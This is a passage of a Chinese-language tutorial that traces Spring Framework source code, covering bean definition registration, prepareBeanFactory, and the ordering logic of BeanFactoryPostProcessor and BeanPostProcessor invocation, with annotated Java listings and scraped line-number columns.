{\n\t\t\tstring profilespec = root.getattribute(profile_attribute);\n\t\t\tif (stringutils.hastext(profilespec)) {\n\t\t\t\tstring[] specifiedprofiles = stringutils.tokenizetostringarray(\n\t\t\t\t\t\tprofilespec, beandefinitionparserdelegate.multi_value_attribute_delimiters);\n\t\t\t\t// we cannot use profiles.of(...) since profile expressions are not supported\n\t\t\t\t// in xml config. see spr-12458 for details.\n\t\t\t\tif (!getreadercontext().getenvironment().acceptsprofiles(specifiedprofiles)) {\n\t\t\t\t\tif (logger.isdebugenabled()) {\n\t\t\t\t\t\tlogger.debug("skipped xml bean definition file due to specified profiles [" + profilespec +\n\t\t\t\t\t\t\t\t"] not matching: " + getreadercontext().getresource());\n\t\t\t\t\t}\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tpreprocessxml(root);\n\t\t// 解析xml 将xml元素转化为beandefinition\n\t\tparsebeandefinitions(root, this.delegate);\n\t\tpostprocessxml(root);\n\t\tthis.delegate = parent;\n \n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n根据上面的解释我们直接进入parsebeandefinitions(root, this.delegate);\n\n再进入parsedefaultelement(ele, delegate)\n\nprivate void parsedefaultelement(element ele, beandefinitionparserdelegate delegate) {\n\tif (delegate.nodenameequals(ele, import_element)) {\n\t\t//处理import标签\n\t\timportbeandefinitionresource(ele);\n\t}\n\telse if (delegate.nodenameequals(ele, alias_element)) {\n\t\t//处理alias标签\n\t\tprocessaliasregistration(ele);\n\t}\n\telse if (delegate.nodenameequals(ele, bean_element)) {\n\t\t//处理bean标签\n\t\tprocessbeandefinition(ele, delegate);\n\t}\n\telse if (delegate.nodenameequals(ele, nested_beans_element)) {\n\t\t// 处理beans标签\n\t\tdoregisterbeandefinitions(ele);\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n进入processbeandefinition(ele, delegate);我们只关心bean\n\nprotected void processbeandefinition(element ele, beandefinitionparserdelegate delegate) {\n\t// xml节点信息转化为beandefinitionholder对象\n\tbeandefinitionholder bdholder = delegate.parsebeandefinitionelement(ele);\n\tif (bdholder != null) {\n\t\t//如果有自定义属性的话 进行相应的解析\n\t\tbdholder = delegate.decoratebeandefinitionifrequired(ele, bdholder);\n\t\ttry {\n\t\t\t// register the final decorated instance.\n\t\t\t// 这一步就是注册bean啦\n\t\t\tbeandefinitionreaderutils.registerbeandefinition(bdholder, getreadercontext().getregistry());\n\t\t}\n\t\tcatch (beandefinitionstoreexception ex) {\n\t\t\tgetreadercontext().error("failed to register bean definition with name \'" +\n\t\t\t\t\tbdholder.getbeanname() + "\'", ele, ex);\n\t\t}\n\t\t// send registration event.\n\t\tgetreadercontext().firecomponentregistered(new beancomponentdefinition(bdholder));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n进入registerbeandefinition方法\n\n\tpublic static void registerbeandefinition(\n\t\t\tbeandefinitionholder definitionholder, beandefinitionregistry registry)\n\t\t\tthrows beandefinitionstoreexception {\n \n\t\t// register bean definition under primary name.\n\t\tstring beanname = definitionholder.getbeanname();\n\t\tregistry.registerbeandefinition(beanname, definitionholder.getbeandefinition());\n \n\t\t// register aliases for bean name, if any.\n\t\tstring[] aliases = definitionholder.getaliases();\n\t\tif (aliases != null) {\n\t\t\tfor (string alias : aliases) {\n\t\t\t\tregistry.registeralias(beanname, alias);\n\t\t\t}\n\t\t}\n\t}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n再进入registry.registerbeandefinition\n\npublic void registerbeandefinition(string beanname, beandefinition beandefinition)\n\t\t\tthrows beandefinitionstoreexception {\n\n    assert.hastext(beanname, "bean name must not be empty");\n    assert.notnull(beandefinition, "beandefinition must not be null");\n\n    if (beandefinition instanceof abstractbeandefinition) {\n        try {\n            ((abstractbeandefinition) beandefinition).validate();\n        }\n        catch (beandefinitionvalidationexception ex) {\n            throw new beandefinitionstoreexception(beandefinition.getresourcedescription(), beanname,\n                                                   "validation of bean definition failed", ex);\n        }\n    }\n\n    beandefinition existingdefinition = this.beandefinitionmap.get(beanname);\n    if (existingdefinition != null) {\n        if (!isallowbeandefinitionoverriding()) {\n            throw new beandefinitionoverrideexception(beanname, beandefinition, existingdefinition);\n        }\n        else if (existingdefinition.getrole() < beandefinition.getrole()) {\n            // e.g. was role_application, now overriding with role_support or role_infrastructure\n            if (logger.isinfoenabled()) {\n                logger.info("overriding user-defined bean definition for bean \'" + beanname +\n                            "\' with a framework-generated bean definition: replacing [" +\n                            existingdefinition + "] with [" + beandefinition + "]");\n            }\n        }\n        else if (!beandefinition.equals(existingdefinition)) {\n            if (logger.isdebugenabled()) {\n                logger.debug("overriding bean definition for bean \'" + beanname +\n                             "\' with a different definition: replacing [" + existingdefinition +\n                             "] with [" + beandefinition + "]");\n            }\n        }\n        else {\n            if (logger.istraceenabled()) {\n                logger.trace("overriding bean definition for bean \'" + beanname +\n                             "\' with an equivalent definition: replacing [" + existingdefinition +\n                             "] with [" + beandefinition + "]");\n            }\n        }\n        this.beandefinitionmap.put(beanname, beandefinition);\n    }\n    else {\n        if (hasbeancreationstarted()) {\n            // cannot modify startup-time collection elements anymore (for stable iteration)\n            synchronized (this.beandefinitionmap) {\n                this.beandefinitionmap.put(beanname, beandefinition);\n                list<string> updateddefinitions = new arraylist<>(this.beandefinitionnames.size() + 1);\n                updateddefinitions.addall(this.beandefinitionnames);\n                updateddefinitions.add(beanname);\n                this.beandefinitionnames = updateddefinitions;\n                removemanualsingletonname(beanname);\n            }\n        }\n        else {\n            // still in startup registration phase\n            this.beandefinitionmap.put(beanname, beandefinition);\n            this.beandefinitionnames.add(beanname);\n            removemanualsingletonname(beanname);\n        }\n        this.frozenbeandefinitionnames = null;\n    }\n\n    if (existingdefinition != null || containssingleton(beanname)) {\n        resetbeandefinition(beanname);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n然后我们看看这个defaultlistablebeanfactory的关系图\n\n\n\n到此为止基本就创建完了，最后执行获取这个操作了。\n\n\tpublic final configurablelistablebeanfactory getbeanfactory() {\n \n            //因为在刚才的refreshbeanfactory()方法中，我们已经将beanfactory这个类设置到this当中了\n            //所以在这个地方直接获取\n\tsynchronized (this.beanfactorymonitor) {\n\t\tif (this.beanfactory == null) {\n\t\t\tthrow new illegalstateexception("beanfactory not initialized or already closed - " +\n\t\t\t\t\t"call \'refresh\' before accessing beans via the applicationcontext");\n\t\t}\n\t\treturn this.beanfactory;\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 5.5 preparebeanfactory()\n\nprotected void preparebeanfactory(configurablelistablebeanfactory beanfactory) {\n    //设置类加载器：存在则直接设置/不存在则新建一个默认类加载器\n    beanfactory.setbeanclassloader(getclassloader());\n    //设置el表达式解析器（bean初始化完成后填充属性时会用到）\n    beanfactory.setbeanexpressionresolver(new standardbeanexpressionresolver(beanfactory.getbeanclassloader()));\n    //设置属性注册解析器propertyeditor\n    beanfactory.addpropertyeditorregistrar(new resourceeditorregistrar(this, getenvironment()));\n    // 将当前的applicationcontext对象交给applicationcontextawareprocessor类来处理，从而在aware接口实现类中的注入applicationcontext\n    beanfactory.addbeanpostprocessor(new applicationcontextawareprocessor(this));\n    //设置忽略自动装配的接口\n    beanfactory.ignoredependencyinterface(resourceloaderaware.class);\n    beanfactory.ignoredependencyinterface(applicationeventpublisheraware.class);\n    beanfactory.ignoredependencyinterface(messagesourceaware.class);\n    beanfactory.ignoredependencyinterface(applicationcontextaware.class);\n    beanfactory.ignoredependencyinterface(environmentaware.class);\n    //注册可以解析的自动装配\n    // messagesource registered (and found for autowiring) as a bean.\n    beanfactory.registerresolvabledependency(beanfactory.class, beanfactory);\n    beanfactory.registerresolvabledependency(resourceloader.class, this);\n    beanfactory.registerresolvabledependency(applicationeventpublisher.class, this);\n    beanfactory.registerresolvabledependency(applicationcontext.class, this);\n    //如果当前beanfactory包含loadtimeweaver bean，说明存在类加载期织入aspectj，则把当前beanfactory交给类加载期beanpostprocessor实现类loadtimeweaverawareprocessor来处理，从而实现类加载期织入aspectj的目的。\n    if (beanfactory.containsbean(load_time_weaver_bean_name)) {\n        beanfactory.addbeanpostprocessor(new loadtimeweaverawareprocessor(beanfactory));\n        // set a temporary classloader for type matching.\n        beanfactory.settempclassloader(new contexttypematchclassloader(beanfactory.getbeanclassloader()));\n    }\n    //注册当前容器环境environment组件bean\n    if (!beanfactory.containslocalbean(environment_bean_name)) {\n        beanfactory.registersingleton(environment_bean_name, getenvironment());\n    }\n    //注册系统配置systemproperties组件bean\n    if (!beanfactory.containslocalbean(system_properties_bean_name)) {\n        beanfactory.registersingleton(system_properties_bean_name, getenvironment().getsystemproperties());\n    }\n    //注册系统环境systemenvironment组件bean\n    if (!beanfactory.containslocalbean(system_environment_bean_name)) {\n        beanfactory.registersingleton(system_environment_bean_name, getenvironment().getsystemenvironment());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# 5.6 postprocessbeanfactory()\n\nspring中并没有具体去实现postprocessbeanfactory方法，作用是在beanfactory准备工作完成后做一些定制化的处理。\n\n\n# 5.7 核心方法之一 invokebeanfactorypostprocessors()\n\ninstantiate and invoke all registered beanfactorypostprocessor beans,respecting explicit order if given.\n\n上面是对这个方法的描述，调用所有注册的beanfactorypostprocessor，并遵循显式顺序（如果给定的话）。\n\nbeanfactorypostprocessor 接口是 spring 初始化 beanfactory 时对外暴露的扩展点，spring ioc 容器允许 beanfactorypostprocessor 在容器实例化任何 bean 之前读取 bean 的定义，并可以修改它。\n\nprotected void invokebeanfactorypostprocessors(configurablelistablebeanfactory beanfactory) {\n            //getbeanfactorypostprocessors(): 拿到当前应用上下文beanfactorypostprocessors变量中的值\n            //invokebeanfactorypostprocessors: 实例化并调用所有已注册的beanfactorypostprocessor\n            postprocessorregistrationdelegate.invokebeanfactorypostprocessors(beanfactory, getbeanfactorypostprocessors());\n \n\t// detect a loadtimeweaver and prepare for weaving, if found in the meantime\n\t// (e.g. through an @bean method registered by configurationclasspostprocessor)\n\tif (beanfactory.gettempclassloader() == null && beanfactory.containsbean(load_time_weaver_bean_name)) {\n\t\tbeanfactory.addbeanpostprocessor(new loadtimeweaverawareprocessor(beanfactory));\n\t\tbeanfactory.settempclassloader(new contexttypematchclassloader(beanfactory.getbeanclassloader()));\n\t}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n这一段代码的核心在于获取和调用，下面进行详细的讲解 getbeanfactorypostprocessors()，这个方法默认是没有的，返回null\n\npublic list<beanfactorypostprocessor> getbeanfactorypostprocessors() {\n\treturn this.beanfactorypostprocessors;\n}\n\n\n1\n2\n3\n\n\n如何添加自定义 beanfactorypostprocessor 到 this.beanfactorypostprocessors 变量中了？\n\n新建一个 applicationcontextinitializer 的实现类 springapplicationcontextinitializer ，并在 initialize 方法中写我们的逻辑。\n\npackage com.joonwhee.open.demo.spring;\nimport org.springframework.context.applicationcontextinitializer;\nimport org.springframework.context.configurableapplicationcontext;\n/**\n * @author joonwhee\n * @date 2019/1/19\n */\npublic class springapplicationcontextinitializer implements applicationcontextinitializer<configurableapplicationcontext> {\n    @override\n    public void initialize(configurableapplicationcontext applicationcontext) {\n        firstbeandefinitionregistrypostprocessor firstbeandefinitionregistrypostprocessor = new firstbeandefinitionregistrypostprocessor();\n        // 将自定义的firstbeandefinitionregistrypostprocessor添加到应用上下文中\n        applicationcontext.addbeanfactorypostprocessor(firstbeandefinitionregistrypostprocessor);\n        // ...自定义操作\n        system.out.println("springapplicationcontextinitializer#initialize");\n    }\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n将 springapplicationcontextinitializer 作为初始化参数 contextinitializerclasses 配置到 web.xml 中。\n\n<context-param>\n    <param-name>contextinitializerclasses</param-name>\n    <param-value>\n        com.joonwhee.open.demo.spring.springapplicationcontextinitializer\n    </param-value>\n</context-param>\n\n\n1\n2\n3\n4\n5\n6\n\n\ninvokebeanfactorypostprocessors方法\n\n \npublic static void invokebeanfactorypostprocessors(\n        configurablelistablebeanfactory beanfactory, list<beanfactorypostprocessor> beanfactorypostprocessors) {\n \n \n \n    // invoke beandefinitionregistrypostprocessors first, if any.\n \n    set<string> processedbeans = new hashset<string>();\n \n \n \n    // 1.判断beanfactory是否为beandefinitionregistry，beanfactory为defaultlistablebeanfactory,\n \n    // 而defaultlistablebeanfactory实现了beandefinitionregistry接口，因此这边为true\n \n    if (beanfactory instanceof beandefinitionregistry) {\n \n        beandefinitionregistry registry = (beandefinitionregistry) beanfactory;\n \n        // 用于存放普通的beanfactorypostprocessor\n \n        list<beanfactorypostprocessor> regularpostprocessors = new linkedlist<beanfactorypostprocessor>();\n \n        // 用于存放beandefinitionregistrypostprocessor\n \n        list<beandefinitionregistrypostprocessor> registryprocessors = new linkedlist<beandefinitionregistrypostprocessor>();\n \n \n \n        // 2.首先处理入参中的beanfactorypostprocessors\n \n        // 遍历所有的beanfactorypostprocessors, 将beandefinitionregistrypostprocessor和普通beanfactorypostprocessor区分开\n \n        for (beanfactorypostprocessor postprocessor : beanfactorypostprocessors) {\n \n            if (postprocessor instanceof beandefinitionregistrypostprocessor) {\n \n                // 2.1 如果是beandefinitionregistrypostprocessor\n \n                beandefinitionregistrypostprocessor registryprocessor =\n \n                        (beandefinitionregistrypostprocessor) postprocessor;\n \n                // 2.1.1 直接执行beandefinitionregistrypostprocessor接口的postprocessbeandefinitionregistry方法\n \n                registryprocessor.postprocessbeandefinitionregistry(registry);\n \n                // 2.1.2 添加到registryprocessors(用于最后执行postprocessbeanfactory方法)\n \n                registryprocessors.add(registryprocessor);\n \n            } else {\n \n                // 2.2 否则，只是普通的beanfactorypostprocessor\n \n                // 2.2.1 添加到regularpostprocessors(用于最后执行postprocessbeanfactory方法)\n \n                regularpostprocessors.add(postprocessor);\n \n            }\n \n        }\n \n \n \n        // do not initialize factorybeans here: we need to leave all regular beans\n \n        // uninitialized to let the bean factory post-processors apply to them!\n \n        // separate between beandefinitionregistrypostprocessors that implement\n \n        // priorityordered, ordered, and the rest.\n \n        // 用于保存本次要执行的beandefinitionregistrypostprocessor\n \n        list<beandefinitionregistrypostprocessor> currentregistryprocessors = new arraylist<beandefinitionregistrypostprocessor>();\n \n \n \n        // first, invoke the beandefinitionregistrypostprocessors that implement priorityordered.\n \n        // 3.调用所有实现priorityordered接口的beandefinitionregistrypostprocessor实现类\n \n        // 3.1 找出所有实现beandefinitionregistrypostprocessor接口的bean的beanname\n \n        string[] postprocessornames =\n \n                beanfactory.getbeannamesfortype(beandefinitionregistrypostprocessor.class, true, false);\n \n        // 3.2 遍历postprocessornames\n \n        for (string ppname : postprocessornames) {\n \n            // 3.3 校验是否实现了priorityordered接口\n \n            if (beanfactory.istypematch(ppname, priorityordered.class)) {\n \n                // 3.4 获取ppname对应的bean实例, 添加到currentregistryprocessors中,\n \n                // beanfactory.getbean: 这边getbean方法会触发创建ppname对应的bean对象, 目前暂不深入解析\n \n                currentregistryprocessors.add(beanfactory.getbean(ppname, beandefinitionregistrypostprocessor.class));\n \n                // 3.5 将要被执行的加入processedbeans，避免后续重复执行\n \n                processedbeans.add(ppname);\n \n            }\n \n        }\n \n        // 3.6 进行排序(根据是否实现priorityordered、ordered接口和order值来排序)\n \n        sortpostprocessors(currentregistryprocessors, beanfactory);\n \n        // 3.7 添加到registryprocessors(用于最后执行postprocessbeanfactory方法)\n \n        registryprocessors.addall(currentregistryprocessors);\n \n        // 3.8 遍历currentregistryprocessors, 执行postprocessbeandefinitionregistry方法\n \n        invokebeandefinitionregistrypostprocessors(currentregistryprocessors, registry);\n \n        // 3.9 执行完毕后, 清空currentregistryprocessors\n \n        currentregistryprocessors.clear();\n \n \n \n        // next, invoke the beandefinitionregistrypostprocessors that implement ordered.\n \n        // 4.调用所有实现了ordered接口的beandefinitionregistrypostprocessor实现类（过程跟上面的步骤3基本一样）\n \n        // 4.1 找出所有实现beandefinitionregistrypostprocessor接口的类, 这边重复查找是因为执行完上面的beandefinitionregistrypostprocessor,\n \n        // 可能会新增了其他的beandefinitionregistrypostprocessor, 因此需要重新查找\n \n        postprocessornames = beanfactory.getbeannamesfortype(beandefinitionregistrypostprocessor.class, true, false);\n \n        for (string ppname : postprocessornames) {\n \n            // 校验是否实现了ordered接口，并且还未执行过\n \n            if (!processedbeans.contains(ppname) && beanfactory.istypematch(ppname, ordered.class)) {\n \n                currentregistryprocessors.add(beanfactory.getbean(ppname, beandefinitionregistrypostprocessor.class));\n \n                processedbeans.add(ppname);\n \n            }\n \n        }\n \n        sortpostprocessors(currentregistryprocessors, beanfactory);\n \n        registryprocessors.addall(currentregistryprocessors);\n \n        // 4.2 遍历currentregistryprocessors, 执行postprocessbeandefinitionregistry方法\n \n        invokebeandefinitionregistrypostprocessors(currentregistryprocessors, registry);\n \n        currentregistryprocessors.clear();\n \n \n \n        // finally, invoke all other beandefinitionregistrypostprocessors until no further ones appear.\n \n        // 5.最后, 调用所有剩下的beandefinitionregistrypostprocessors\n \n        boolean reiterate = true;\n \n        while (reiterate) {\n \n            reiterate = false;\n \n            // 5.1 找出所有实现beandefinitionregistrypostprocessor接口的类\n \n            postprocessornames = beanfactory.getbeannamesfortype(beandefinitionregistrypostprocessor.class, true, false);\n \n            for (string ppname : postprocessornames) {\n \n                // 5.2 跳过已经执行过的\n \n                if (!processedbeans.contains(ppname)) {\n \n                    currentregistryprocessors.add(beanfactory.getbean(ppname, beandefinitionregistrypostprocessor.class));\n \n                    processedbeans.add(ppname);\n \n                    // 5.3 如果有beandefinitionregistrypostprocessor被执行, 则有可能会产生新的beandefinitionregistrypostprocessor,\n \n                    // 因此这边将reiterate赋值为true, 代表需要再循环查找一次\n \n                    reiterate = true;\n \n                }\n \n            }\n \n            sortpostprocessors(currentregistryprocessors, beanfactory);\n \n            registryprocessors.addall(currentregistryprocessors);\n \n            // 5.4 遍历currentregistryprocessors, 执行postprocessbeandefinitionregistry方法\n \n            invokebeandefinitionregistrypostprocessors(currentregistryprocessors, registry);\n \n            currentregistryprocessors.clear();\n \n        }\n \n \n \n        // now, invoke the postprocessbeanfactory callback of all processors handled so far.\n \n        // 6.调用所有beandefinitionregistrypostprocessor的postprocessbeanfactory方法(beandefinitionregistrypostprocessor继承自beanfactorypostprocessor)\n \n        invokebeanfactorypostprocessors(registryprocessors, beanfactory);\n \n        // 7.最后, 调用入参beanfactorypostprocessors中的普通beanfactorypostprocessor的postprocessbeanfactory方法\n \n        invokebeanfactorypostprocessors(regularpostprocessors, beanfactory);\n \n    } else {\n \n        // invoke factory processors registered with the context instance.\n \n        invokebeanfactorypostprocessors(beanfactorypostprocessors, beanfactory);\n \n    }\n \n \n \n    // 到这里 , 入参beanfactorypostprocessors和容器中的所有beandefinitionregistrypostprocessor已经全部处理完毕,\n \n    // 下面开始处理容器中的所有beanfactorypostprocessor\n \n \n \n    // do not initialize factorybeans here: we need to leave all regular beans\n \n    // uninitialized to let the bean factory post-processors apply to them!\n \n    // 8.找出所有实现beanfactorypostprocessor接口的类\n \n    string[] postprocessornames =\n \n            beanfactory.getbeannamesfortype(beanfactorypostprocessor.class, true, false);\n \n \n \n    // separate between beanfactorypostprocessors that implement priorityordered,\n \n    // ordered, and the rest.\n \n    // 用于存放实现了priorityordered接口的beanfactorypostprocessor\n \n    list<beanfactorypostprocessor> priorityorderedpostprocessors = new arraylist<beanfactorypostprocessor>();\n \n    // 用于存放实现了ordered接口的beanfactorypostprocessor的beanname\n \n    list<string> orderedpostprocessornames = new arraylist<string>();\n \n    // 用于存放普通beanfactorypostprocessor的beanname\n \n    list<string> nonorderedpostprocessornames = new arraylist<string>();\n \n    // 8.1 遍历postprocessornames, 将beanfactorypostprocessor按实现priorityordered、实现ordered接口、普通三种区分开\n \n    for (string ppname : postprocessornames) {\n \n        // 8.2 跳过已经执行过的\n \n        if (processedbeans.contains(ppname)) {\n \n            // skip - already processed in first phase above\n \n        } else if (beanfactory.istypematch(ppname, priorityordered.class)) {\n \n            // 8.3 添加实现了priorityordered接口的beanfactorypostprocessor\n \n            priorityorderedpostprocessors.add(beanfactory.getbean(ppname, beanfactorypostprocessor.class));\n \n        } else if (beanfactory.istypematch(ppname, ordered.class)) {\n \n            // 8.4 添加实现了ordered接口的beanfactorypostprocessor的beanname\n \n            orderedpostprocessornames.add(ppname);\n \n        } else {\n \n            // 8.5 添加剩下的普通beanfactorypostprocessor的beanname\n \n            nonorderedpostprocessornames.add(ppname);\n \n        }\n \n    }\n \n \n \n    // first, invoke the beanfactorypostprocessors that implement priorityordered.\n \n    // 9.调用所有实现priorityordered接口的beanfactorypostprocessor\n \n    // 9.1 对priorityorderedpostprocessors排序\n \n    sortpostprocessors(priorityorderedpostprocessors, beanfactory);\n \n    // 9.2 遍历priorityorderedpostprocessors, 执行postprocessbeanfactory方法\n \n    invokebeanfactorypostprocessors(priorityorderedpostprocessors, beanfactory);\n \n \n \n    // next, invoke the beanfactorypostprocessors that implement ordered.\n \n    // 10.调用所有实现ordered接口的beanfactorypostprocessor\n \n    list<beanfactorypostprocessor> orderedpostprocessors = new arraylist<beanfactorypostprocessor>();\n \n    for (string postprocessorname : orderedpostprocessornames) {\n \n        // 10.1 获取postprocessorname对应的bean实例, 添加到orderedpostprocessors, 准备执行\n \n        orderedpostprocessors.add(beanfactory.getbean(postprocessorname, beanfactorypostprocessor.class));\n \n    }\n \n    // 10.2 对orderedpostprocessors排序\n \n    sortpostprocessors(orderedpostprocessors, beanfactory);\n \n    // 10.3 遍历orderedpostprocessors, 执行postprocessbeanfactory方法\n \n    invokebeanfactorypostprocessors(orderedpostprocessors, beanfactory);\n \n \n \n    // finally, invoke all other beanfactorypostprocessors.\n \n    // 11.调用所有剩下的beanfactorypostprocessor\n \n    list<beanfactorypostprocessor> nonorderedpostprocessors = new arraylist<beanfactorypostprocessor>();\n \n    for (string postprocessorname : nonorderedpostprocessornames) {\n \n        // 11.1 获取postprocessorname对应的bean实例, 添加到nonorderedpostprocessors, 准备执行\n \n        nonorderedpostprocessors.add(beanfactory.getbean(postprocessorname, beanfactorypostprocessor.class));\n \n    }\n \n    // 11.2 遍历nonorderedpostprocessors, 执行postprocessbeanfactory方法\n \n    invokebeanfactorypostprocessors(nonorderedpostprocessors, beanfactory);\n \n \n \n    // clear cached merged bean definitions since the post-processors might have\n \n    // modified the original metadata, e.g. replacing placeholders in values...\n \n    // 12.清除元数据缓存（mergedbeandefinitions、allbeannamesbytype、singletonbeannamesbytype），\n \n    // 因为后处理器可能已经修改了原始元数据，例如， 替换值中的占位符...\n \n    beanfactory.clearmetadatacache();\n \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n305\n306\n307\n308\n309\n310\n311\n312\n313\n314\n315\n316\n317\n318\n319\n320\n321\n322\n323\n324\n325\n326\n327\n328\n329\n330\n331\n332\n333\n334\n335\n336\n337\n338\n339\n340\n341\n342\n343\n344\n345\n346\n347\n348\n349\n350\n351\n352\n353\n354\n355\n356\n357\n358\n359\n360\n361\n362\n363\n364\n365\n366\n367\n368\n369\n370\n371\n\n\n\n# 5.8 核心方法之一 registerbeanpostprocessors()\n\n本方法会注册所有的 beanpostprocessor，将所有实现了 beanpostprocessor 接口的类加载到 beanfactory 中。beanpostprocessor 接口是 spring 初始化 bean 时对外暴露的扩展点，spring ioc 容器允许 beanpostprocessor 在容器初始化 bean 的前后，添加自己的逻辑处理。\n\n \npublic static void registerbeanpostprocessors(\n        configurablelistablebeanfactory beanfactory, abstractapplicationcontext applicationcontext) {\n \n \n \n    // 1.找出所有实现beanpostprocessor接口的类\n \n    string[] postprocessornames = beanfactory.getbeannamesfortype(beanpostprocessor.class, true, false);\n \n \n \n    // register beanpostprocessorchecker that logs an info message when\n \n    // a bean is created during beanpostprocessor instantiation, i.e. when\n \n    // a bean is not eligible for getting processed by all beanpostprocessors.\n \n    // beanpostprocessor的目标计数\n \n    int beanprocessortargetcount = beanfactory.getbeanpostprocessorcount() + 1 + postprocessornames.length;\n \n    // 2.添加beanpostprocessorchecker(主要用于记录信息)到beanfactory中\n \n    beanfactory.addbeanpostprocessor(new beanpostprocessorchecker(beanfactory, beanprocessortargetcount));\n \n \n \n    // separate between beanpostprocessors that implement priorityordered,\n \n    // ordered, and the rest.\n \n    // 3.定义不同的变量用于区分: 实现priorityordered接口的beanpostprocessor、实现ordered接口的beanpostprocessor、普通beanpostprocessor\n \n    // 3.1 priorityorderedpostprocessors: 用于存放实现priorityordered接口的beanpostprocessor\n \n    list<beanpostprocessor> priorityorderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    // 3.2 internalpostprocessors: 用于存放spring内部的beanpostprocessor\n \n    list<beanpostprocessor> internalpostprocessors = new arraylist<beanpostprocessor>();\n \n    // 3.3 orderedpostprocessornames: 用于存放实现ordered接口的beanpostprocessor的beanname\n \n    list<string> orderedpostprocessornames = new arraylist<string>();\n \n    // 3.4 nonorderedpostprocessornames: 用于存放普通beanpostprocessor的beanname\n \n    list<string> nonorderedpostprocessornames = new arraylist<string>();\n \n    // 4.遍历postprocessornames, 将beanpostprocessors按3.1 - 3.4定义的变量区分开\n \n    for (string ppname : postprocessornames) {\n \n        if (beanfactory.istypematch(ppname, priorityordered.class)) {\n \n            // 4.1 如果ppname对应的bean实例实现了priorityordered接口, 则拿到ppname对应的bean实例并添加到priorityorderedpostprocessors\n \n            beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n            priorityorderedpostprocessors.add(pp);\n \n            if (pp instanceof mergedbeandefinitionpostprocessor) {\n \n                // 4.2 如果ppname对应的bean实例也实现了mergedbeandefinitionpostprocessor接口,\n \n                // 则将ppname对应的bean实例添加到internalpostprocessors\n \n                internalpostprocessors.add(pp);\n \n            }\n \n        }\n \n        else if (beanfactory.istypematch(ppname, ordered.class)) {\n \n            // 4.3 如果ppname对应的bean实例没有实现priorityordered接口, 但是实现了ordered接口, 则将ppname添加到orderedpostprocessornames\n \n            orderedpostprocessornames.add(ppname);\n \n        }\n \n        else {\n \n            // 4.4 否则, 将ppname添加到nonorderedpostprocessornames\n \n            nonorderedpostprocessornames.add(ppname);\n \n        }\n \n    }\n \n \n \n    // first, register the beanpostprocessors that implement priorityordered.\n \n    // 5.首先, 注册实现priorityordered接口的beanpostprocessors\n \n    // 5.1 对priorityorderedpostprocessors进行排序\n \n    sortpostprocessors(priorityorderedpostprocessors, beanfactory);\n \n    // 5.2 注册priorityorderedpostprocessors\n \n    registerbeanpostprocessors(beanfactory, priorityorderedpostprocessors);\n \n \n \n    // next, register the beanpostprocessors that implement ordered.\n \n    // 6.接下来, 注册实现ordered接口的beanpostprocessors\n \n    list<beanpostprocessor> orderedpostprocessors = new arraylist<beanpostprocessor>();\n \n    for (string ppname : orderedpostprocessornames) {\n \n        // 6.1 拿到ppname对应的beanpostprocessor实例对象\n \n        beanpostprocessor pp = beanfactory.getbean(ppname, beanpostprocessor.class);\n \n     